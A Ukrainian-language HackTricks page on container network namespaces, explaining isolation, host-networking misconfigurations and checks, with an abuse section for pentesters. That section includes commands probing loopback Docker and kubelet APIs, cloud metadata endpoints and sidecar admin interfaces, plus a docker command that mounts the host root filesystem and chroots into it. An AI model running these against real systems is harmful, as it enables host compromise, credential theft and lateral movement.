# Мережевий namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий namespace ізолює ресурси, пов'язані з мережею, зокрема інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила firewall, сокети, абстрактний namespace UNIX-domain сокетів і вміст файлів на кшталт `/proc/net`.<sup>[[2]](#references)</sup> Саме тому контейнер може мати власний, на вигляд, `eth0`, власні локальні маршрути та власний loopback-пристрій, не володіючи справжнім мережевим стеком host.

З погляду безпеки це важливо, оскільки мережева ізоляція охоплює значно більше, ніж прив'язування портів. Приватний мережевий namespace обмежує те, що workload може безпосередньо спостерігати або переналаштовувати. Щойно цей namespace стає спільним із host, контейнер може раптово отримати видимість host listeners, локальних сервісів host, абстрактних кінцевих точок AF_UNIX і мережевих точок керування, які ніколи не призначалися для відкриття застосунку.

## Робота

Щойно створений мережевий namespace починається з порожнього або майже порожнього мережевого середовища, доки до нього не буде під'єднано інтерфейси. Після цього container runtimes створюють або під'єднують virtual interfaces, призначають адреси та налаштовують маршрути, щоб workload отримав очікувану connectivity. У deployments на основі bridge це зазвичай означає, що контейнер бачить інтерфейс на основі veth, під'єднаний до host bridge. У Kubernetes CNI plugins виконують еквівалентне налаштування для Pod networking.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` є настільки кардинальною зміною. Замість отримання підготовленого приватного мережевого стека workload приєднується до фактичного стека host.

## Лабораторна робота

Ви можете побачити майже порожній мережевий namespace за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
І ви можете порівняти звичайні контейнери та контейнери з мережевим режимом host за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер із host networking більше не має власного ізольованого представлення сокетів та інтерфейсів. Одна лише ця зміна вже є суттєвою, ще до того, як ви почнете з'ясовувати, які capabilities має процес.

## Використання під час роботи

Docker і Podman зазвичай створюють приватний network namespace для кожного контейнера, якщо не налаштовано інакше. Kubernetes зазвичай надає кожному Pod власний network namespace, спільний для контейнерів усередині цього Pod, але окремий від host. Це означає, що `127.0.0.1` зазвичай є локальним для Pod, а не для контейнера: listener, прив'язаний лише до localhost в одному контейнері, зазвичай доступний його sidecar-ам і сусіднім контейнерам. Системи Incus/LXC також забезпечують розвинену ізоляцію на основі network namespace, часто з ширшим розмаїттям конфігурацій віртуальних мереж.

Загальний принцип полягає в тому, що приватна мережа є стандартною межею ізоляції, тоді як host networking є явною відмовою від цієї межі.

## Неправильні конфігурації

Найважливішою неправильною конфігурацією є простий спільний доступ до network namespace host. Іноді це роблять заради продуктивності, низькорівневого моніторингу або зручності, але це усуває одну з найчіткіших доступних контейнерам меж. Listener-и, локальні для host, стають доступними більш безпосередньо, сервіси, доступні лише через localhost, можуть стати доступними, а capabilities на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають значно небезпечнішими, оскільки операції, які вони дають змогу виконувати, тепер застосовуються до власного мережевого середовища host.

Ще однією проблемою є надмірне надання пов'язаних із мережею capabilities, навіть якщо network namespace є приватним. Приватний namespace справді допомагає, але він не робить raw sockets або розширене керування мережею безпечними.

У Kubernetes `hostNetwork: true` також змінює те, наскільки можна покладатися на сегментацію мережі на рівні Pod. У документації Kubernetes зазначено, що багато network plugins не можуть належним чином відрізнити трафік Pod із `hostNetwork` під час зіставлення `podSelector` / `namespaceSelector`, тому розглядають його як звичайний трафік node.<sup>[[1]](#references)</sup> З точки зору атакера це означає, що скомпрометований workload із `hostNetwork` часто слід розглядати як мережеву точку опори на рівні node, а не як звичайний Pod, який і надалі обмежений тими самими припущеннями щодо policy, що й workload-и в overlay network.

## Зловживання

У середовищах зі слабкою ізоляцією атакери можуть перевіряти listening services host, отримувати доступ до management endpoints, прив'язаних лише до loopback, прослуховувати або втручатися в трафік залежно від конкретних capabilities та середовища, а також змінювати routing і firewall state, якщо присутня `CAP_NET_ADMIN`. У кластері це також може спростити lateral movement і розвідку control plane.

Якщо ви підозрюєте використання host networking, почніть із підтвердження того, що видимі інтерфейси та listener-и належать host, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Сервіси, доступні лише через loopback, часто є першим цікавим відкриттям:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Абстрактні UNIX-сокети — ще одна легка для пропуску ціль, оскільки вони мають область дії мережевого простору імен, хоча не схожі на слухачі TCP/UDP і можуть не існувати як шляхи файлової системи в `/run`. Тому контейнер із мережею хоста може успадкувати доступ до каналів керування, призначених лише для хоста, які взагалі не монтувалися через bind mount у контейнер:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Історичним прикладом була вразливість розкриття abstract socket `containerd-shim`, але ширший висновок важливіший за конкретний CVE: щойно workload приєднується до мережевого namespace хоста, abstract AF_UNIX-сервіси також стають частиною attack surface.<sup>[[3]](#references)</sup> Якщо такі сокети схожі на пов’язані з runtime або адміністративні, переходьте до [впливу на Runtime API та daemon](../../runtime-api-and-daemon-exposure.md).

Якщо мережеві capabilities доступні, перевірте, чи може workload переглядати або змінювати видимий stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У сучасних ядрах host networking разом із `CAP_NET_ADMIN` може також відкривати доступ до шляху проходження пакетів, що виходить за межі простих змін `iptables` / `nftables`. Дескриптори та фільтри `tc` також мають область дії namespace, тому в спільному host network namespace вони застосовуються до інтерфейсів хоста, які бачить контейнер. Якщо додатково присутній `CAP_BPF`, стають також актуальними мережеві програми eBPF, такі як завантажувачі TC і XDP:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Це важливо, оскільки зловмисник може дзеркалити, перенаправляти, формувати або відкидати трафік на рівні інтерфейсу хоста, а не лише переписувати правила firewall. У приватному network namespace ці дії обмежені представленням контейнера; у спільному host namespace вони впливають на хост.

У кластерних або cloud-середовищах host networking також виправдовує швидкий локальний recon метаданих і сервісів, суміжних із control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
У Kubernetes пам’ятайте, що компрометація **будь-якого** container у multi-container Pod також надає доступ до localhost listeners, відкритих sibling containers і sidecars, оскільки весь Pod спільно використовує один network namespace. Це особливо важливо для service-mesh, observability і helper containers, чиї admin- або debug-інтерфейси навмисно доступні лише всередині Pod, а не в усьому кластері:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Вважайте, що «прив’язано до localhost» означає **приватне для Pod**, а не **приватне для container**. Після компрометації одного container у Pod це припущення більше не діє.

### Повний приклад: Host Networking + доступ до локального Runtime / Kubelet

Host networking не надає root на host автоматично, але часто відкриває доступ до сервісів, які навмисно доступні лише з самого node. Якщо один із цих сервісів має слабкий захист, host networking стає прямим шляхом до privilege-escalation.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Вплив:

- безпосередня компрометація хоста, якщо локальний runtime API доступний без належного захисту
- розвідка кластера або lateral movement, якщо kubelet чи локальні агенти доступні
- маніпуляція трафіком або відмова в обслуговуванні в поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — з’ясувати, чи має процес приватний мережевий стек, які маршрути й слухачі видимі, а також чи виглядає мережеве оточення подібним до хостового ще до перевірки capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Що тут важливо:

- Якщо `/proc/self/ns/net` і `/proc/1/ns/net` уже виглядають схожими на host, контейнер може спільно використовувати мережевий namespace host або інший неп приватний namespace.
- `lsns -t net` і `ip netns identify` корисні, коли shell уже перебуває всередині іменованого або постійного namespace, і потрібно зіставити його з об’єктами `/run/netns` з боку host.
- `ss -lntup` особливо цінний, оскільки показує слухачі, доступні лише через loopback, і локальні кінцеві точки керування. `ss -xap` та `/proc/net/unix` додають представлення абстрактних сокетів, які не охоплюють звичайні пошуки сокетів у файловій системі.
- Маршрути, назви інтерфейсів, контекст firewall, стан `tc` і приєднання eBPF стають набагато важливішими, якщо присутні `CAP_NET_ADMIN`, `CAP_NET_RAW` або `CAP_BPF`.
- У Kubernetes невдала роздільна здатність імені сервісу з Pod із `hostNetwork` може просто означати, що Pod не використовує `dnsPolicy: ClusterFirstWithHostNet`, а не те, що сервіс відсутній.
- У Pod із кількома контейнерами слухачі localhost належать усьому мережевому namespace Pod, тому перед тим, як вважати порт, доступний лише через loopback, недосяжним із скомпрометованого контейнера, перевірте sidecar- і сусідні контейнери.

Під час перевірки контейнера завжди оцінюйте мережевий namespace разом із набором capabilities. Host networking у поєднанні з потужними мережевими capabilities — це зовсім інший рівень захищеності, ніж bridge networking із вузьким набором capabilities за замовчуванням.

## Посилання

- [1] [Застереження щодо Kubernetes NetworkPolicy і `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` та ізоляція абстрактних UNIX-сокетів](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [Рекомендація containerd: абстрактні Unix domain sockets, відкриті для контейнерів із host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Вимоги до eBPF token і capabilities для мережевих програм eBPF](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
